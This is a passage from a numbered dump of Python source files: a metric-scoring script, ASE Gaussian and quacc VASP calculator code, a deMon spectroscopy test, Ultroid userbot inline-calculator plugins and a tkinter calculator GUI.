m_type==\"bart\":\n        print(\"List size: {}\".format(len(lines)))\n        for nn in num_nodes:\n            ex_index=[]\n            ind=0\n            for i in range(0,len(lines),4):\n                if int(lines[i])  == nn  and nn < 7:\n                    ex_index.append(ind)\n                else:\n                    if nn >= 7:\n                        if int(lines[i]) >= nn:\n                            ex_index.append(ind)\n                ind+=1\n            # print(calc_score(\"QuestEval\",ex_index,nn,qeval_l))\n            # print(calc_score(\"Bleu\",ex_index,nn,bleu))\n            # print(calc_score(\"Bleurt\",ex_index,nn,bleurt))\n            #print(calc_score(\"BARTSore\",ex_index,nn,bartscore))\n            print(calc_score(\"Meteor\",ex_index,nn,meteor))\n            print(calc_score(\"Rouge1\",ex_index,nn,rouge1))\n            print(calc_score(\"Rouge2\",ex_index,nn,rouge2))\n            print(calc_score(\"RougeL\",ex_index,nn,rougeL))\n      \n    else:\n        for nn in num_nodes:\n            ex_index=[]\n            ind=0\n            for line in lines:\n                if int(line)  == nn  and nn < 7:\n                    ex_index.append(ind)\n                else:\n                    if nn >= 7:\n                        if int(line) >= nn:\n                            ex_index.append(ind)\n                ind+=1\n    #print(\"List size: {}\".format(len(ex_index)))  \n            print(calc_score(\"Meteor\",ex_index,nn,meteor))\n            print(calc_score(\"Rouge1\",ex_index,nn,rouge1))\n            print(calc_score(\"rouge2\",ex_index,nn,rouge2))\n            print(calc_score(\"rougeL\",ex_index,nn,rougeL))\n            #print(calc_score(\"Bleurt\",ex_index,nn,bleurt))\n            #print(len(nub))\n            #print(calc_score(\"Nubia\",ex_index,nn,nub))\n            print(calc_score(\"Bert-score\",ex_index,nn,bert_s))\n            print(calc_score(\"Bleu\",ex_index,nn,bleu))\n            # print(calc_score(\"RR\",ex_index,nn,repts))\n    #print(calc_score(\"QuestEval\",ex_index,nn,qeval_l))\n\n    \n  \n\n\ndef calc_score(name,ex_index,num_nodes,lines=[]):\n    import numpy as np\n    scores=[]\n    print(len(ex_index))\n    for c in ex_index:\n        scores.append(float(lines[c]))\n    return {name+\"-\" + str(num_nodes) : np.mean(scores)}\n", "305": "import os\nimport copy\nfrom collections.abc import Iterable\nfrom shutil import which\nfrom typing import Dict, Optional\n\nfrom ase.io import read, write\nfrom ase.calculators.calculator import FileIOCalculator, EnvironmentError\n\n\nclass GaussianDynamics:\n    calctype = 'optimizer'\n    delete = ['force']\n    keyword: Optional[str] = None\n    special_keywords: Dict[str, str] = dict()\n\n    def __init__(self, atoms, calc=None):\n        self.atoms = atoms\n        if calc is not None:\n            self.calc = calc\n        else:\n            if self.atoms.calc is None:\n                raise ValueError(\"{} requires a valid Gaussian calculator \"\n                                 \"object!\".format(self.__class__.__name__))\n\n            self.calc = self.atoms.calc\n\n    def todict(self):\n        return {'type': self.calctype,\n                'optimizer': self.__class__.__name__}\n\n    def delete_keywords(self, kwargs):\n        \"\"\"removes list of keywords (delete) from kwargs\"\"\"\n        for d in self.delete:\n            kwargs.pop(d, None)\n\n    def set_keywords(self, kwargs):\n        args = kwargs.pop(self.keyword, [])\n        if isinstance(args, str):\n            args = [args]\n        elif isinstance(args, Iterable):\n            args = list(args)\n\n        for key, template in self.special_keywords.items():\n            if key in kwargs:\n                val = kwargs.pop(key)\n                args.append(template.format(val))\n\n        kwargs[self.keyword] = args\n\n    def run(self, **kwargs):\n        calc_old = self.atoms.calc\n        params_old = copy.deepcopy(self.calc.parameters)\n\n        self.delete_keywords(kwargs)\n        self.delete_keywords(self.calc.parameters)\n        self.set_keywords(kwargs)\n\n        self.calc.set(**kwargs)\n        self.atoms.calc = self.calc\n\n        try:\n            self.atoms.get_potential_energy()\n        except OSError:\n            converged = False\n        else:\n            converged = True\n\n        atoms = read(self.calc.label + '.log')\n        self.atoms.cell = atoms.cell\n        self.atoms.positions = atoms.positions\n\n        self.calc.parameters = params_old\n        self.calc.reset()\n        if calc_old is not None:\n            self.atoms.calc = calc_old\n\n        return converged\n\n\nclass GaussianOptimizer(GaussianDynamics):\n    keyword = 'opt'\n    special_keywords = {\n        'fmax': '{}',\n        'steps': 'maxcycle={}',\n    }\n\n\nclass GaussianIRC(GaussianDynamics):\n    keyword = 'irc'\n    special_keywords = {\n        'direction': '{}',\n        'steps': 'maxpoints={}',\n    }\n\n\nclass Gaussian(FileIOCalculator):\n    implemented_properties = ['energy', 'forces', 'dipole']\n    command = 'GAUSSIAN < PREFIX.com > PREFIX.log'\n    discard_results_on_any_change = True\n\n    def __init__(self, *args, label='Gaussian', **kwargs):\n        FileIOCalculator.__init__(self, *args, label=label, **kwargs)\n\n    def calculate(self, *args, **kwargs):\n        gaussians = ('g16', 'g09', 'g03')\n        if 'GAUSSIAN' in self.command:\n            for gau in gaussians:\n                if which(gau):\n                    self.command = self.command.replace('GAUSSIAN', gau)\n                    break\n            else:\n                raise EnvironmentError('Missing Gaussian executable {}'\n                                       .format(gaussians))\n\n        FileIOCalculator.calculate(self, *args, **kwargs)\n\n    def write_input(self, atoms, properties=None, system_changes=None):\n        FileIOCalculator.write_input(self, atoms, properties, system_changes)\n        write(self.label + '.com', atoms, properties=properties,\n              format='gaussian-in', **self.parameters)\n\n    def read_results(self):\n        output = read(self.label + '.log', format='gaussian-out')\n        self.calc = output.calc\n        self.results = output.calc.results\n\n    # Method(s) defined in the old calculator, added here for\n    # backwards compatibility\n    def clean(self):\n        for suffix in ['.com', '.chk', '.log']:\n            try:\n                os.remove(os.path.join(self.directory, self.label + suffix))\n            except OSError:\n                pass\n\n    def get_version(self):\n        raise NotImplementedError  # not sure how to do this yet\n", "306": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "307": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\n\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await ultroid_bot.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "308": "import ase.calculators.demon as demon\nfrom ase import Atoms\nimport numpy as np\n\n\ndef test_h2o_xas_xes():\n    # d = 0.9575\n    d = 0.9775\n    # t = np.pi / 180 * 104.51\n    t = np.pi / 180 * 110.51\n    atoms = Atoms('H2O',\n                  positions=[(d, 0, 0),\n                             (d * np.cos(t), d * np.sin(t), 0),\n                             (0, 0, 0)])\n\n    # set up deMon calculator\n    basis = {'all': 'aug-cc-pvdz'}\n    auxis = {'all': 'GEN-A2*'}\n\n    # XAS hch\n    input_arguments = {'GRID': 'FINE',\n                       'MOMODIFY': [[1, 0],\n                                    [1, 0.5]],\n                       'CHARGE': 0,\n                       'XRAY': 'XAS'}\n\n    calc = demon.Demon(basis=basis,\n                       auxis=auxis,\n                       scftype='UKS TOL=1.0E-6 CDF=1.0E-5',\n                       guess='TB',\n                       xc=['BLYP', 'BASIS'],\n                       input_arguments=input_arguments)\n\n    atoms.calc = calc\n\n    # energy\n    print('XAS hch')\n    print('energy')\n    energy = atoms.get_potential_energy()\n    print(energy)\n    ref = -1815.44708987  # -469.604737006\n    error = np.sqrt(np.sum((energy - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    # check xas\n    results = calc.results\n\n    print('xray, first transition, energy')\n    value = results['xray']['E_trans'][0]\n    print(value)\n    ref = 539.410015646\n    error = np.sqrt(np.sum((value - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    print('xray, first transition, transition dipole moments')\n    value = results['xray']['trans_dip'][0]\n    print(value)\n    ref = np.array([1.11921906e-02, 1.61393975e-02, 1.70983631e-07])\n    error = np.sqrt(np.sum((value - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    # XES\n    input_arguments = {'GRID': 'FINE',\n                       'CHARGE': 0,\n                       'XRAY': 'XES ALPHA=1-1'}\n\n    calc = demon.Demon(basis=basis,\n                       auxis=auxis,\n                       scftype='UKS TOL=1.0E-6 CDF=1.0E-5',\n                       guess='TB',\n                       xc=['BLYP', 'BASIS'],\n                       input_arguments=input_arguments)\n\n    atoms.calc = calc\n\n    # energy\n    print('')\n    print('XES')\n    print('energy')\n    energy = atoms.get_potential_energy()\n    print(energy)\n    ref = -2079.6635944\n    error = np.sqrt(np.sum((energy - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    # check xes\n    results = calc.results\n\n    print('xray, first transition, energy')\n    value = results['xray']['E_trans'][0]\n    print(value)\n    ref = 486.862715888  # 539.410015646\n    error = np.sqrt(np.sum((value - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    print('xray, first transition, transition dipole moments')\n    value = results['xray']['trans_dip'][0]\n    print(value)\n    ref = np.array([6.50528073e-03, 9.37895253e-03, 6.99433480e-09])\n    error = np.sqrt(np.sum((value - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    # and XPS\n    input_arguments = {'GRID': 'FINE',\n                       'MOMODIFY': [[1, 0],\n                                    [1, 0.0]],\n                       'CHARGE': 0,\n                       'XRAY': 'XAS'}\n\n    calc = demon.Demon(basis=basis,\n                       auxis=auxis,\n                       scftype='UKS TOL=1.0E-6 CDF=1.0E-5',\n                       guess='TB',\n                       xc=['BLYP', 'BASIS'],\n                       input_arguments=input_arguments)\n\n    atoms.calc = calc\n\n    # energy\n    print('')\n    print('XPS')\n    print('energy')\n    energy = atoms.get_potential_energy()\n    print(energy)\n    ref = -1536.9295935\n    error = np.sqrt(np.sum((energy - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    # First excited state\n    input_arguments = {'GRID': 'FINE',\n                       'MOMODIFY': [[1, 0],\n                                    [1, 0.0]],\n                       'CHARGE': -1}\n\n    calc = demon.Demon(basis=basis,\n                       auxis=auxis,\n                       scftype='UKS TOL=1.0E-6 CDF=1.0E-5',\n                       guess='TB',\n                       xc=['BLYP', 'BASIS'],\n                       input_arguments=input_arguments)\n\n    atoms.calc = calc\n\n    # energy\n    print('')\n    print('EXC')\n    print('energy')\n    energy = atoms.get_potential_energy()\n    print(energy)\n    ref = -1543.18092135\n    error = np.sqrt(np.sum((energy - ref)**2))\n    print('diff from reference:')\n    print(error)\n\n    tol = 1.0e-4\n    assert error < tol\n\n    print('tests passed')\n", "309": "# Import packages\nfrom tkinter import *\nimport math\n\n# Function to add in the entry of text display\ndef button_click(char):\n    global calc_operator\n    calc_operator += str(char)\n    text_input.set(calc_operator)\n\n# Function to clear the whole entry of text display\ndef button_clear_all():\n    global calc_operator\n    calc_operator = \"\"\n    text_input.set(\"\")\n\n# Function to delete one by one from the last in the entry of text display\ndef button_delete():\n    global calc_operator\n    text = calc_operator[:-1]\n    calc_operator = text\n    text_input.set(text)\n\n# Function to calculate trigonometric numbers of an angle\ndef trig_sin():\n    global calc_operator\n    result = str(math.sin(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_cos():\n    global calc_operator\n    result = str(math.cos(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_tan():\n    global calc_operator\n    result = str(math.tan(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\n# Function to find the square root of a number\ndef square_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/2)'))\n        calc_operator = temp\n    else:\n        temp = \"ERROR\"\n    text_input.set(temp)\n\n# Function to change the sign of number\ndef sign_change():\n    global calc_operator\n    if calc_operator[0]=='-':\n        temp = calc_operator[1:]\n    else:\n        temp = '-'+calc_operator\n    calc_operator = temp\n    text_input.set(temp)    \n\n# Function to calculate the percentage of a number\ndef percent():\n    global calc_operator\n    temp = str(eval(calc_operator+'/100'))\n    calc_operator = temp\n    text_input.set(temp)\n\n# Funtion to find the result of an operation\ndef button_equal():\n    global calc_operator\n    temp_op = str(eval(calc_operator))\n    text_input.set(temp_op)\n    calc_operator = temp_op\n\n'''\nVariables\n'''\nsin, cos, tan = math.sin, math.cos, math.tan\n\ntk_calc = Tk()\ntk_calc.configure(bg=\"#001a4d\", bd=10)\ntk_calc.title(\"Calculator\")\n\ncalc_operator = \"\"\ntext_input = StringVar()\n\ntext_display = Entry(tk_calc, font=('sans-serif', 20, 'bold'), textvariable=text_input,\n                     bd=5, bg='#BBB', justify='right').grid(columnspan=4, padx=10, pady=20) \n\nbutton_params = {'bd':5, 'fg':'#BBB', 'bg':'#1f1f2e', 'font':('sans-serif', 20, 'bold')}\nbutton_params_op={'bd':5, 'fg':'#0052cc', 'bg':'#1f1f2e', 'font':('sans-serif', 20, 'bold')}\n\n'''\nButtons\n'''\n#--1st row--\ndelete_one = Button(tk_calc, bd=5, fg='#0052cc', font=('sans-serif',20,'bold'),\n              text='DEL', command=button_delete, bg='#1f1f2e').grid(row=1, column=0, sticky=\"nsew\")\ndelete_all = Button(tk_calc, bd=5, fg='#0052cc', font=('sans-serif', 20, 'bold'),\n              text='C', command=button_clear_all, bg='#1f1f2e').grid(row=1, column=1, sticky=\"nsew\")\n# Change the sign of a number\nsigns = Button(tk_calc, button_params_op, text='\u00b1',\n               command=sign_change).grid(row=1, column=2, sticky=\"nsew\")\n# nth root of a number\nnth_root = Button(tk_calc, button_params_op, text='\u221a',\n                  command=square_root).grid(row=1, column=3, sticky=\"nsew\")\n\n#--2rd row--\n# Sine of an angle in degrees\nsine = Button(tk_calc, button_params, text='sin',\n             command=trig_sin).grid(row=2, column=0, sticky=\"nsew\")\n# Cosine of an angle in degrees\ncosine = Button(tk_calc, button_params, text='cos',\n             command=trig_cos).grid(row=2, column=1, sticky=\"nsew\")\n# Tangent of an angle in degrees\ntangent = Button(tk_calc, button_params, text='tan',\n             command=trig_tan).grid(row=2, column=2, sticky=\"nsew\")\n#--3th row--\nadd = Button(tk_calc, button_params_op, text='+',\n             command=lambda:button_click('+')).grid(row=2, column=3, sticky=\"nsew\")\n\n#--4th row--\nmul = Button(tk_calc, button_params_op, text='*',\n             command=lambda:button_click('*')).grid(row=3, column=3, sticky=\"nsew\")\nbutton_7 = Button(tk_calc, button_params, text='7',\n                  command=lambda:button_click('7')).grid(row=3, column=0, sticky=\"nsew\")\nbutton_8 = Button(tk_calc, button_params, text='8',\n                  command=lambda:button_click('8')).grid(row=3, column=1, sticky=\"nsew\")\nbutton_9 = Button(tk_calc, button_params, text='9',\n                  command=lambda:button_click('9')).grid(row=3, column=2, sticky=\"nsew\")\n\n\n#--5th row--\nbutton_4 = Button(tk_calc, button_params, text='4',\n                  command=lambda:button_click('4')).grid(row=4, column=0, sticky=\"nsew\")\nbutton_5 = Button(tk_calc, button_params, text='5',\n                  command=lambda:button_click('5')).grid(row=4, column=1, sticky=\"nsew\")\nbutton_6 = Button(tk_calc, button_params, text='6',\n                  command=lambda:button_click('6')).grid(row=4, column=2, sticky=\"nsew\")\ndiv = Button(tk_calc, button_params_op, text='/',\n             command=lambda:button_click('/')).grid(row=4, column=3, sticky=\"nsew\")\n\n#--6th row--\nbutton_1 = Button(tk_calc, button_params, text='1',\n                  command=lambda:button_click('1')).grid(row=5, column=0, sticky=\"nsew\")\nbutton_2 = Button(tk_calc, button_params, text='2',\n                  command=lambda:button_click('2')).grid(row=5, column=1, sticky=\"nsew\")\nbutton_3 = Button(tk_calc, button_params, text='3',\n                  command=lambda:button_click('3')).grid(row=5, column=2, sticky=\"nsew\")\nsub = Button(tk_calc, button_params_op, text='-',\n             command=lambda:button_click('-')).grid(row=5, column=3, sticky=\"nsew\")\n\n#--7th row--\n# Transform number to percentage\npercentage = Button(tk_calc, button_params, text='%',\n               command=percent).grid(row=6, column=0, sticky=\"nsew\")\nbutton_0 = Button(tk_calc, button_params, text='0',\n                  command=lambda:button_click('0')).grid(row=6, column=1, sticky=\"nsew\")\npoint = Button(tk_calc, button_params, text='.',\n               command=lambda:button_click('.')).grid(row=6, column=2, sticky=\"nsew\")\nequal = Button(tk_calc, button_params_op, text='=',\n               command=button_equal).grid(row=6, column=3, sticky=\"nsew\")\n\ntk_calc.mainloop()\n", "310": "\"\"\"\nA wrapper around ASE's Vasp calculator that makes it better suited for high-throughput DFT.\n\"\"\"\nfrom __future__ import annotations\n\nimport inspect\nimport os\nimport warnings\nfrom typing import Any, Dict, List, Tuple\n\nimport numpy as np\nfrom ase.atoms import Atoms\nfrom ase.calculators.vasp import Vasp as Vasp_\nfrom ase.calculators.vasp.setups import _setups_defaults as ase_default_setups\nfrom ase.constraints import FixAtoms\n\nfrom quacc import SETTINGS\nfrom quacc.custodian import vasp as custodian_vasp\nfrom quacc.presets import vasp as vasp_defaults\nfrom quacc.util.atoms import check_is_metal, get_highest_block, set_magmoms\nfrom quacc.util.basics import load_yaml_calc\nfrom quacc.util.calc import _convert_auto_kpts\n\nDEFAULT_CALCS_DIR = os.path.dirname(vasp_defaults.__file__)\n\n\nclass Vasp(Vasp_):\n    \"\"\"\n    This is a wrapper around the Vasp calculator that adjusts INCAR parameters on-the-fly,\n    allows for ASE to run VASP via Custodian, and supports several automatic k-point generation schemes\n    from Pymatgen.\n\n    Parameters\n    ----------\n    atoms\n        The Atoms object to be used for the calculation.\n    preset\n        The path to a .yaml file containing a list of INCAR parameters to use as a \"preset\"\n        for the calculator. If no filepath is present, it will look in quacc/defaults/calcs/vasp, such\n        that preset=\"BulkRelaxSet\" is supported. It will append .yaml at the end if not present.\n        Note that any specific kwargs take precedence over the flags set in the preset dictionary.\n    custodian\n        Whether to use Custodian to run VASP.\n        Default is True in settings.\n    incar_copilot\n        If True, the INCAR parameters will be adjusted if they go against the VASP manual.\n        Default is True in settings.\n    copy_magmoms\n        If True, any pre-existing atoms.get_magnetic_moments() will be set in atoms.set_initial_magnetic_moments().\n        Set this to False if you want to use a preset's magnetic moments every time.\n    preset_mag_default\n        Default magmom value for sites without one explicitly specified in the preset. Only used if a preset is\n        specified with an elemental_mags_dict key-value pair.\n        Default is 1.0 in settings.\n    mag_cutoff\n        Set all initial magmoms to 0 if all have a magnitude below this value.\n        Default is 0.05 in settings.\n    verbose\n        If True, warnings will be raised when INCAR parameters are changed.\n    **kwargs\n        Additional arguments to be passed to the VASP calculator, e.g. xc='PBE', encut=520. Takes all valid\n        ASE calculator arguments, in addition to those custom to QuAcc.\n\n    Returns\n    -------\n    Atoms\n        The ASE Atoms object with attached VASP calculator.\n    \"\"\"\n\n    def __init__(\n        self,\n        atoms: Atoms,\n        preset: None | str = None,\n        custodian: bool = SETTINGS.VASP_CUSTODIAN,\n        incar_copilot: bool = SETTINGS.VASP_INCAR_COPILOT,\n        copy_magmoms: bool = SETTINGS.VASP_COPY_MAGMOMS,\n        preset_mag_default: float = SETTINGS.VASP_PRESET_MAG_DEFAULT,\n        mag_cutoff: None | float = SETTINGS.VASP_MAG_CUTOFF,\n        verbose: bool = SETTINGS.VASP_VERBOSE,\n        **kwargs,\n    ):\n\n        # Check constraints\n        if (\n            custodian\n            and atoms.constraints\n            and not all(isinstance(c, FixAtoms) for c in atoms.constraints)\n        ):\n            raise ValueError(\n                \"Atoms object has a constraint that is not compatible with Custodian\"\n            )\n\n        # Get VASP executable command, if necessary, and specify child environment\n        # variables\n        command = _manage_environment(custodian)\n\n        # Get user-defined preset parameters for the calculator\n        if preset:\n            calc_preset = load_yaml_calc(os.path.join(DEFAULT_CALCS_DIR, preset))[\n                \"inputs\"\n            ]\n        else:\n            calc_preset = {}\n\n        # Collect all the calculator parameters and prioritize the kwargs\n        # in the case of duplicates.\n        user_calc_params = {**calc_preset, **kwargs}\n        none_keys = [k for k, v in user_calc_params.items() if v is None]\n        for none_key in none_keys:\n            del user_calc_params[none_key]\n\n        # Allow the user to use setups='mysetups.yaml' to load in a custom setups\n        # from a YAML file\n        if (\n            isinstance(user_calc_params.get(\"setups\"), str)\n            and user_calc_params[\"setups\"] not in ase_default_setups\n        ):\n            user_calc_params[\"setups\"] = load_yaml_calc(\n                os.path.join(DEFAULT_CALCS_DIR, user_calc_params[\"setups\"])\n            )[\"inputs\"][\"setups\"]\n\n        # If the preset has auto_kpts but the user explicitly requests kpts, then\n        # we should honor that.\n        if kwargs.get(\"kpts\") and calc_preset.get(\"auto_kpts\"):\n            del user_calc_params[\"auto_kpts\"]\n\n        # Handle special arguments in the user calc parameters that\n        # ASE does not natively support\n        if user_calc_params.get(\"elemental_magmoms\"):\n            elemental_mags_dict = user_calc_params[\"elemental_magmoms\"]\n        else:\n            elemental_mags_dict = None\n        if user_calc_params.get(\"auto_kpts\"):\n            auto_kpts = user_calc_params[\"auto_kpts\"]\n        else:\n            auto_kpts = None\n        if user_calc_params.get(\"auto_dipole\"):\n            auto_dipole = user_calc_params[\"auto_dipole\"]\n        else:\n            auto_dipole = None\n        user_calc_params.pop(\"elemental_magmoms\", None)\n        user_calc_params.pop(\"auto_kpts\", None)\n        user_calc_params.pop(\"auto_dipole\", None)\n\n        # Make automatic k-point mesh\n        if auto_kpts:\n            kpts, gamma, reciprocal = _convert_auto_kpts(atoms, auto_kpts)\n            user_calc_params[\"kpts\"] = kpts\n            if reciprocal and user_calc_params.get(\"reciprocal\") is None:\n                user_calc_params[\"reciprocal\"] = reciprocal\n            if user_calc_params.get(\"gamma\") is None:\n                user_calc_params[\"gamma\"] = gamma\n\n        # Add dipole corrections if requested\n        if auto_dipole:\n            com = atoms.get_center_of_mass(scaled=True)\n            if \"dipol\" not in user_calc_params:\n                user_calc_params[\"dipol\"] = com\n            if \"idipol\" not in user_calc_params:\n                user_calc_params[\"idipol\"] = 3\n            if \"ldipol\" not in user_calc_params:\n                user_calc_params[\"ldipol\"] = True\n\n        # Set magnetic moments\n        set_magmoms(\n            atoms,\n            elemental_mags_dict=elemental_mags_dict,\n            copy_magmoms=copy_magmoms,\n            elemental_mags_default=preset_mag_default,\n            mag_cutoff=mag_cutoff,\n        )\n\n        # Handle INCAR swaps as needed\n        if incar_copilot:\n            user_calc_params = _calc_swaps(\n                atoms, user_calc_params, auto_kpts=auto_kpts, verbose=verbose\n            )\n\n        # Remove unused INCAR flags\n        user_calc_params = _remove_unused_flags(user_calc_params)\n\n        # Instantiate the calculator!\n        super().__init__(atoms=atoms, command=command, **user_calc_params)\n\n\ndef _manage_environment(custodian: bool = True) -> str:\n    \"\"\"\n    Manage the environment for the VASP calculator.\n\n    Parameters\n    ----------\n    custodian\n        If True, Custodian will be used to run VASP.\n\n    Returns\n    -------\n    str\n        The command flag to pass to the Vasp calculator.\n    \"\"\"\n\n    # Check ASE environment variables\n    if \"VASP_PP_PATH\" not in os.environ:\n        warnings.warn(\n            \"The VASP_PP_PATH environment variable must point to the library of VASP pseudopotentials. See the ASE Vasp calculator documentation for details.\",\n        )\n\n    # Check if Custodian should be used and 